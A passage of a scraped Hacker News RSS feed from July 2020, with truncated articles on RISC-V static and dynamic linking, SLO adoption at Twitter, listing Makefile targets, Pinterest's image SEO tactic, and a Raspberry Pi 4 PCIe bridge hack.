<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;

void some_func(int a, int b)
{
	printf("Data = %d\n", a * b);
}
</pre>



<p>It’s very simple, but the point is to have some code that the linker can pull in. Recall that the linker gave us an “undefined reference” error because we didn’t define some_func. Now, we have it defined, so let’s see what happens.</p>



<pre>riscv64-unknown-linux-gnu-gcc -static -o test test2.o test.o</pre>



<p>Notice that I’m using gcc still. This will automatically invoke the linker and pull in the necessary <em>start files</em>. If we invoke the linker directly, we have to define _start and tell the program how to start, or we would have to directly specify the start files.</p>



<p>I specify -static so that gcc will pull in only .a files. When we are done, the file <em>test</em> will be a fully-contained, static executable. If we take a look at this file, we can see that all of the “stuff” we need for this executable makes it a fairly large file.</p>



<pre>-rwxr-xr-x 1 smarz smarz 4687920 Jun 1 09:16 test</pre>



<p>Yes, that’s 4,687,920 bytes or about 4.7 megabytes. However, if we looked at the symbol table, we will find that NO symbol is unresolved, and therefore this is a self contained executable. If we load this with our elf loader, no external resources will need to be pulled in.</p>



<p>Our linker must exhaustively follow every possible route and pull in those symbols even though they may never be called. We can see the symbol table is enormous due to all of the calls and global variable (such as errno).</p>



<pre>00000000000101b0 T abort<br>000000000006bb38 S __abort_msg<br>0000000000029aa8 t add_alias2.isra.0.part.0<br>00000000000497c6 t add_fdes<br>00000000000297ea t add_module.isra.0<br>000000000003aa4e t add_name_to_object.isra.0<br>000000000003ab5c t add_path.isra.0.constprop.0<br>000000000006b8d0 d adds.8114<br>000000000002fe2e T __add_to_environ<br>00000000000431b6 t add_to_global<br>000000000001adb4 t adjust_wide_data<br>000000000006bba0 V __after_morecore_hook<br>0000000000012d3a t alias_compare<br>000000000002338a W aligned_alloc<br>000000000006bb80 s aligned_heap_area<br>000000000003ff04 t allocate_dtv<br>000000000003a40c T __alloc_dir<br>000000000006ca38 b any_objects_regis</pre>



<hr>



<h2 id="dynamic">Dynamic Libraries (shared objects)</h2>



<p>Dynamic libraries end in .so, which stands for <em>shared object</em>. These libraries contain code that will not be added directly into the executable. Instead a program called the <em>dynamic linker</em> will be responsible for taking code from the .so files and adding them into an executing program. We can also add symbols ourselves using the -ldl (dynamic linker) library.</p>



<p>We can think of the term <em>dynamic</em> as <em>run-time</em>. That is, we don’t actually load the code into our program until the program actually runs. We can see this with something as simple as printf. We can examine our executable and we don’t see printf’s code. Instead, we see printf’s <em>stub</em>. This stub will then be replaced by the dynamic loader when the program executes.</p>



<p>When we link with a dynamic, shared object, those symbols that can be added at run time will remain unresolved. We will have the symbols’ names put into a table just so we know it’s out there somewhere. However, with shared objects, we now can get that <em>unresolved reference</em> (or symbol) at run-time! If you have arch-linux and have ever compiled anything yourself, you might’ve run into this phenomenon.</p>



<hr>



<h2>Making a Shared Library</h2>



<p>Let’s go ahead and turn our test2 file into a shared object. This is fairly easy to do with gcc:</p>



<pre>riscv64-unknown-linux-gcc -fPIC -shared -o libtest2.so test2.o</pre>



<p>The switch -fPIC stands for <em>position independent code</em>. That means all offsets cannot be relative outside of the library itself, and this is usually the case for most shared libraries. In this case, the generated code will be placed into a table to find the offsets. This is required since the library, or specific symbols in the library, can be loaded into any location by the dynamic linker.</p>



<p>Then, we can compile our test program to link to this shared library:</p>



<pre>riscv64-unknown-linux-gcc -o test test.o -L. -ltest2</pre>



<p>In the command above, I am specify the library search path with -L, so -L. means to look in the current directory. Then, I specify the library to link with using -ltest2. GCC will automatically prepend lib and append .so to make libtest2.so.</p>



<hr>



<h2 id="analyze">Analyzing A Shared Program</h2>



<p>First, we compile in the location of our library. We can see these shared libraries using the ldd command.</p>



<pre>smarz@DOMO:~ $ ./test<br>
./test: error while loading shared libraries: libtest2.so: cannot open shared object file: No such file or directory</pre>



<p>So, when I run my program, it looks at a certain path to find your libraries. This is analogous to the PATH environment variable, except in Linux (and some UNIXes), we use LD_LIBRARY_PATH. Shown below, if I change my path so the dynamic linker can find my library, it functions properly:</p>



<pre>smarz@DOMO:~ $ LD_LIBRARY_PATH=/home/smarz ./test 10 20<br>
Data = 200</pre>



<hr>



<h2 id="unresolved">Unresolved at Run Time</h2>



<p>When we link a program, many of the symbols will remain unresolved. This tells us what symbols the dynamic linker is responsible for loading from the shared objects (libraries). We can see these unresolved symbols using the nm command:</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/06/image.png" alt="" width="544" height="276" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/06/image.png 544w, https://blog.stephenmarz.com/wp-content/uploads/2020/06/image-300x152.png 300w" sizes="(max-width: 544px) 100vw, 544px"><figcaption>Partial list of symbols in our test program</figcaption></figure></div>



<p>You can see that puts is unresolved (capital U letter), …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2020/06/22/dynamic-linking/">https://blog.stephenmarz.com/2020/06/22/dynamic-linking/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2020/06/22/dynamic-linking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23704160</guid>
            <pubDate>Wed, 01 Jul 2020 17:35:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SLO Adoption at Twitter]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23702876">thread link</a>) | @hannahblameless
<br/>
July 1, 2020 | https://www.blameless.com/blog/slo-adoption-twitter | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/slo-adoption-twitter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blameless.com/blog/slo-adoption-twitter">https://www.blameless.com/blog/slo-adoption-twitter</a></em></p>]]>
            </description>
            <link>https://www.blameless.com/blog/slo-adoption-twitter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702876</guid>
            <pubDate>Wed, 01 Jul 2020 15:55:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to list all the targets on a Makefile]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 54 (<a href="https://news.ycombinator.com/item?id=23702756">thread link</a>) | @diamantidis_io
<br/>
July 1, 2020 | https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets | <a href="https://web.archive.org/web/*/https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
</code></pre></div></div> <p>Then, we will use the <code>grep</code> and <code>sed</code> command to get the name of the target and the documentation, like in the following snippet:</p> <div><div><pre><code>.DEFAULT_GOAL :<span>=</span> <span>help</span>
.PHONY: <span>help

help</span>:
	@grep <span>-E</span> <span>'^[a-zA-Z0-9_-]+:.*?## .*$$'</span> <span>$(</span>MAKEFILE_LIST<span>)</span> <span>\</span>
	| <span>sed</span> <span>-n</span> <span>'s/^\(.*\): \(.*\)##\(.*\)/\1\3/p'</span> <span>\</span>
	| column <span>-t</span>  <span>-s</span> <span>' '</span>
</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>
<pre><code>install  Install
run      Run
</code></pre>
</div></div>]]>
            </description>
            <link>https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702756</guid>
            <pubDate>Wed, 01 Jul 2020 15:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deconstructing Pinterest’s reverse-image-search SEO growth hack]]>
            </title>
            <description>
<![CDATA[
Score 198 | Comments 103 (<a href="https://news.ycombinator.com/item?id=23701998">thread link</a>) | @jenny8lee
<br/>
July 1, 2020 | https://www.rankscience.com/blog/pinterest-image-seo-growth-hack | <a href="https://web.archive.org/web/*/https://www.rankscience.com/blog/pinterest-image-seo-growth-hack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <div id="post-418">
		<div>	
		<p><img src="https://pbs.twimg.com/profile_images/1178728529187495937/xbH7cGaT_400x400.jpg" alt="Ryan Bednar" width="55" height="55"></p>
<p>By <strong><a href="https://twitter.com/ryanbed">Ryan Bednar</a></strong> (CEO of <a href="https://www.rankscience.com/">RankScience</a>)</p>
<blockquote><p><span>Update</span>: This post got a ton of traffic on Hacker News today and&nbsp;Pinterest reached out to comment: “The claim that we scrape Google search results is false. We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png" alt="" width="546" height="293" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png 1208w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-300x161.png 300w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-1024x549.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-768x412.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-600x322.png 600w" sizes="(max-width: 546px) 100vw, 546px"></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>
<h3>Related Posts</h3>
<ul>
<li><a href="https://www.rankscience.com/coderwall-seo-split-test">How Coderwall grew SEO traffic by 57% with a single SEO A/B test</a></li>
<li><a href="https://www.rankscience.com/blog/how-businesses-boost-sales-with-seo-a-b-testing-on-ecommerce-sites">How eCommerce sites are using SEO A/B testing to boost sales</a></li>
</ul>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png" alt="" width="157" height="157" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png 157w, https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo-150x150.png 150w" sizes="(max-width: 157px) 100vw, 157px"></p>
<p>Get Data-Driven about growing your traffic with <a href="https://www.rankscience.com/">RankScience</a>.</p>

		
	</div>

	</div>
    
                </div></div>]]>
            </description>
            <link>https://www.rankscience.com/blog/pinterest-image-seo-growth-hack</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701998</guid>
            <pubDate>Wed, 01 Jul 2020 14:52:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi 4 PCIe bridge “chip”]]>
            </title>
            <description>
<![CDATA[
Score 224 | Comments 154 (<a href="https://news.ycombinator.com/item?id=23701208">thread link</a>) | @fanf2
<br/>
July 1, 2020 | https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/ | <a href="https://web.archive.org/web/*/https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>After seeing the work done by <a rel="noreferrer noopener" href="http://mloduchowski.com/en/blog/raspberry-pi-4-b-pci-express/" target="_blank">Thomasz Mloduchowski</a> and <a rel="noreferrer noopener" href="http://labs.domipheus.com/blog/raspberry-pi-4-pci-express-it-actually-works-usb-sata-gpu/" target="_blank">Colin Riley</a> with managing to bridge the Raspberry Pi 4’s PCI-Express bus to a USB 3.0 port, and then seeing <a rel="noreferrer noopener" href="https://hackaday.com/2019/09/05/pcie-multiplier-expands-raspberry-pi-4-possibilities/#comment-6177569" target="_blank">these comments on hack-a-day</a>, I thought I would give it a go too!</p> <p>So, here’s a PCIe bridge “chip” that simply replaces the VL805 USB 3.0 controller chip on the Pi, giving access to the PCI-Express bus on a USB 3.0 port. <s>However, this does mean losing all USB functionality of the Pi. That could be a bit of a problem if you ever mess up the networking and need to attach a keyboard.</s> Never mind, it seems that the USB-C power connector <a rel="noreferrer noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=29&amp;t=246348&amp;p=1678554" target="_blank">can run as a USB host</a>, allowing a keyboard to be connected if 5V power is supplied through the GPIO header instead.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg" alt="" width="848" height="375" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-300x133.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-768x341.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1536x681.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg 1761w" sizes="(max-width: 848px) 100vw, 848px"></a></figure></div> <p>The bridge “chip” is a 0.8mm thick PCB from OSHPark with copper pads in the same locations as a real VL805 QFN68 IC package, then traces connecting the PCIe pads to the USB pads that connect to the upper USB 3.0 port. RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p> <figure><table><thead><tr><th>PCIe Signal</th><th>Direction</th><th>USB Signal</th></tr></thead><tbody><tr><td>REFCLK+</td><td>Host -&gt; Device</td><td>D-</td></tr><tr><td>REFCLK-</td><td>Host -&gt; Device</td><td>D+</td></tr><tr><td>HSO+</td><td>Host (TX) -&gt; Device (RX)</td><td>RX-</td></tr><tr><td>HSO-</td><td>Host (TX) -&gt; Device (RX)</td><td>RX+</td></tr><tr><td>HSI+</td><td>Device (TX) -&gt; Host (RX)</td><td>TX-</td></tr><tr><td>HSI-</td><td>Device (TX) -&gt; Host (RX)</td><td>TX+</td></tr><tr><td>RESET</td><td>Host -&gt; Device</td><td>D- (lower port)</td></tr><tr><td>WAKE (not connected anywhere)</td><td>Device -&gt; Host</td><td>D+ (lower port)</td></tr><tr><td>CLKREQ</td><td>Host -&gt; Device</td><td>RX+ (lower port)</td></tr><tr><td>PONRST</td><td>Not a PCIe signal, connected like a reset pin on a microcontroller.</td><td>RX- (lower 